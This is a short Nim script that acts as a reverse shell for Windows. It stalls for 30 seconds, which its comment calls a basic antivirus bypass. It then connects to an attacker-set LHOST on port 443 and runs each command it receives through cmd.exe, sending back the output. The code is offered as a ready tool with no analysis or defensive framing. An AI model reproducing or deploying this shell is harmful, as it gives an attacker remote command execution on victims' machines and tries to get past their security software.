import net, osproc, strformat, times

#[Sleep 30 seconds before connecting, basic AV bypass attempt]#
let now1 = now() + 30.seconds
var i = 1


while now() <= now1:
  var i = i + 1

let
  ip = 192.168.1.1 #[LHOST CHANGE THIS]#
  port = 443
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Nim-Shell> "

while true:
  send(sock, prompt)
  let sendCommand = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & sendCommand)
  send(sock, cmd)


